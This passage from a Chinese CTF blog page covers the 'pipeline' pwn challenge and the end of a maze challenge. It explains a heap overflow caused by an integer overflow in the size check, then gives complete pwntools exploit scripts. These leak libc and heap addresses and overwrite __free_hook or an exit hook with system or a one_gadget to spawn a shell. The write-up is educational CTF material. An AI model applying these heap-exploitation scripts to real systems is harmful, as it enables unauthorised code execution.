class="number">1</span>, y],</span><br><span class="line">            [<span class="string">&#x27;s&#x27;</span>, x+<span class="number">1</span>, y],</span><br><span class="line">            [<span class="string">&#x27;a&#x27;</span>, x, y-<span class="number">1</span>],</span><br><span class="line">            [<span class="string">&#x27;d&#x27;</span>, x, y+<span class="number">1</span>],</span><br><span class="line">        ]</span><br><span class="line">        <span class="keyword">for</span> ch, xx, yy <span class="keyword">in</span> action:</span><br><span class="line">            ans += [ch]</span><br><span class="line">            ok = dfs(ans, v, xx, yy)</span><br><span class="line">            <span class="keyword">if</span> ok:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            ans.pop()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    ok = dfs(ans, v, x0, y0)</span><br><span class="line">    <span class="keyword">return</span> ok, <span class="string">&#x27;&#x27;</span>.join(ans)</span><br><span class="line"></span><br><span class="line">name = <span class="string">&quot;LD_DEBUG=all&quot;</span></span><br><span class="line">sla(<span class="string">&quot;name: &quot;</span>,name)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">28</span>)</span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">maze = []</span><br><span class="line">ru(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    data = ru(<span class="string">&quot;\n&quot;</span>)[<span class="number">2</span>:-<span class="number">2</span>]</span><br><span class="line">    data = re.sub(<span class="string">&quot;🚩&quot;</span>,<span class="string">&quot;7&quot;</span>,data)</span><br><span class="line">    data = re.sub(<span class="string">&quot;👴&quot;</span>,<span class="string">&quot;3&quot;</span>,data)</span><br><span class="line">    data = re.sub(<span class="string">&quot;  &quot;</span>,<span class="string">&quot;1&quot;</span>,data)</span><br><span class="line">    data = re.sub(<span class="string">&quot;██&quot;</span>,<span class="string">&quot;0&quot;</span>,data)</span><br><span class="line">    maze.append(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> maze:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line">ok,ans = solve(maze)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(ans)&gt;<span class="number">96</span>:</span><br><span class="line">    exit()</span><br><span class="line">challenge(ans)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;flag: &quot;</span>)</span><br><span class="line">leak_addr = <span class="built_in">eval</span>(ru(<span class="string">&quot;\n&quot;</span>))</span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">96</span>+p16(leak_addr+<span class="number">136</span>)</span><br><span class="line">challenge(payload)</span><br><span class="line"></span><br><span class="line">magic()</span><br><span class="line">ru(<span class="string">&quot; dynamic: &quot;</span>)</span><br><span class="line">leak_addr = <span class="built_in">eval</span>(ru(<span class="string">&quot; &quot;</span>)[:-<span class="number">1</span>])*<span class="number">0x10</span></span><br><span class="line">libc_base =leak_addr - <span class="number">0x1eab80</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">one_gadgets = [<span class="number">0xe6aee</span>,<span class="number">0xe6af1</span>,<span class="number">0xe6af4</span>]</span><br><span class="line">one_gadget = libc_base + one_gadgets[<span class="number">0</span>]</span><br><span class="line">exit_hook = libc_base + <span class="number">0x228f68</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;one_gadget &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(one_gadget))</span><br><span class="line">success(<span class="string">&quot;exit_hook &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(exit_hook))</span><br><span class="line"></span><br><span class="line">offset = exit_hook - <span class="number">0xadad000</span></span><br><span class="line">success(<span class="string">&quot;offset &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(offset))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;Administrator mode&quot;</span>)</span><br><span class="line">sa(<span class="string">&quot;error?&quot;</span>,p64(offset))</span><br><span class="line">success(<span class="string">&quot;one_gadget &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(one_gadget))</span><br><span class="line">sla(<span class="string">&quot;to record?&quot;</span>,p64(one_gadget)+<span class="string">&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="pipeline"><a href="#pipeline" class="headerlink" title="pipeline"></a>pipeline</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.2</span>)</span> stable release version 2.31.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pipeline: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">1660</span>ac5f889c59866adfdd8ab506d59e2951e03a, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>程序对 size 大小有检查：（导致不能使用 mmap 进行分配）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chunkg = <span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">*chunkg = chunkg + <span class="number">2</span>;</span><br><span class="line">chunkg[<span class="number">1</span>] = <span class="number">0x21000</span>LL;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( a1 &lt; *chunkg || (result = *chunkg + chunkg[<span class="number">1</span>], a1 &gt;= result) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序对 offset 也有检查：（导致 offset 不能为负数）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)chunk-&gt;offset &gt;= chunk-&gt;size || (chunk-&gt;offset &amp; <span class="number">0x80000000</span>) != <span class="number">0</span> )</span><br><span class="line">  chunk-&gt;offset = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>整数溢出导致堆溢出：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">size2 = chunk-&gt;size - chunk-&gt;offset;</span><br><span class="line"><span class="keyword">if</span> ( size &lt;= size2 )</span><br><span class="line">  LOWORD(size2) = size;</span><br><span class="line">readn((__int64)chunk-&gt;data + (<span class="built_in">int</span>)chunk-&gt;offset, (__int16)size2);</span><br></pre></td></tr></table></figure>
<ul>
<li>chunk-&gt;offset 是 unsigned int 类型，但 readn 中将其识别为 int </li>
<li>在 <code>LOWORD(size2) = size</code> 中，4字节的 size2 只有低2字节被覆盖，可能导致堆溢出</li>
<li>如果我们输入 0x80000200（负数），程序就会进入 if 语句，但最终只有 0x200 被覆盖到 size2</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>程序没有 free，只有一个 realloc 可以利用：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chunk-&gt;offset = input_num(<span class="string">&quot;offset: &quot;</span>);</span><br><span class="line">chunk-&gt;size = input_num(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">chunk-&gt;data = realloc_s(chunk-&gt;data, chunk-&gt;size);</span><br></pre></td></tr></table></figure>
<p>申请一个大堆块，然后 realloc 一个更大的堆块，配合堆风水就可以泄露 libc_base 和 heap_base</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">add()<span class="comment">#0</span></span><br><span class="line">add()<span class="comment">#1</span></span><br><span class="line">add()<span class="comment">#2</span></span><br><span class="line">add()<span class="comment">#3</span></span><br><span class="line">add()<span class="comment">#4</span></span><br><span class="line">add2(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x450</span>)</span><br><span class="line">add()<span class="comment">#5</span></span><br><span class="line">add2(<span class="number">1</span>,<span class="number">0</span>,<span class="number">0x460</span>)</span><br><span class="line">add2(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x500</span>)</span><br><span class="line">add2(<span class="number">2</span>,<span class="number">0</span>,<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">ru(<span class="string">&quot;data: &quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x1ebfe0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">add2(<span class="number">1</span>,<span class="number">0</span>,<span class="number">0x500</span>)</span><br><span class="line">add2(<span class="number">3</span>,<span class="number">0</span>,<span class="number">0x430</span>)</span><br><span class="line">add2(<span class="number">4</span>,<span class="number">0</span>,<span class="number">0x40</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="number">0x10</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line">ru(<span class="string">&quot;data: &quot;</span>)</span><br><span class="line">ru(<span class="string">&quot;aaaaaaaaaaaaaaaa&quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">heap_base = leak_addr - <span class="number">0x7d0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br></pre></td></tr></table></figure>
<p>由于程序的限制不能直接劫持 tcache，因此需要劫持程序的单链表结构，然后直接修改 free_hook 即可</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./pipeline1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x188A)\n&quot;</span>)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>():</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add2</span>(<span class="params">index,offset,size</span>):</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(offset) == <span class="built_in">int</span>:</span><br><span class="line">        sla(<span class="string">&quot;offset: &quot;</span>,<span class="built_in">str</span>(offset))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sla(<span class="string">&quot;offset: &quot;</span>,offset)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(size) == <span class="built_in">int</span>:</span><br><span class="line">        sla(<span class="string">&quot;size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sla(<span class="string">&quot;size: &quot;</span>,size)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(index))   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,size,data</span>):</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(index))   </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(size) == <span class="built_in">int</span>:</span><br><span class="line">        sla(<span class="string">&quot;size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sla(<span class="string">&quot;size: &quot;</span>,size)</span><br><span class="line">    sla(<span class="string">&quot;data: &quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line">    sla(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add()<span class="comment">#0</span></span><br><span class="line">add()<span class="comment">#1</span></span><br><span class="line">add()<span class="comment">#2</span></span><br><span class="line">add()<span class="comment">#3</span></span><br><span class="line">add()<span class="comment">#4</span></span><br><span class="line">add2(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x450</span>)</span><br><span class="line">add()<span class="comment">#5</span></span><br><span class="line">add2(<span class="number">1</span>,<span class="number">0</span>,<span class="number">0x460</span>)</span><br><span class="line">add2(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x500</span>)</span><br><span class="line">add2(<span class="number">2</span>,<span class="number">0</span>,<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">ru(<span class="string">&quot;data: &quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x1ebfe0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">add2(<span class="number">1</span>,<span class="number">0</span>,<span class="number">0x500</span>)</span><br><span class="line">add2(<span class="number">3</span>,<span class="number">0</span>,<span class="number">0x430</span>)</span><br><span class="line">add2(<span class="number">4</span>,<span class="number">0</span>,<span class="number">0x40</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="number">0x10</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line">ru(<span class="string">&quot;data: &quot;</span>)</span><br><span class="line">ru(<span class="string">&quot;aaaaaaaaaaaaaaaa&quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">heap_base = leak_addr - <span class="number">0x7d0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">add()<span class="comment">#6</span></span><br><span class="line">add2(<span class="number">6</span>,<span class="number">0</span>,<span class="number">0x3f0</span>)</span><br><span class="line">add2(<span class="number">5</span>,<span class="number">0</span>,<span class="number">0x100</span>)</span><br><span class="line">add()<span class="comment">#7</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x108</span>+p64(<span class="number">0x21</span>)+p64(free_hook-<span class="number">0x8</span>)+p64(<span class="number">0x50000000000</span>)</span><br><span class="line">edit(<span class="number">5</span>,<span class="string">&quot;-2147483136&quot;</span>,payload)</span><br><span class="line">payload = <span class="string">&quot;/bin/sh\x00&quot;</span> + p64(system)</span><br><span class="line">edit(<span class="number">7</span>,<span class="number">0x20</span>,payload)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">add2(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/3/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/31/">31</a><a class="extend next" rel="next" href="/page/5/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="yhellow"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">yhellow</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">310</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">13</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">161</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2019 – 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">yhellow</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="Symbols count total">4.6m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">69:22</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
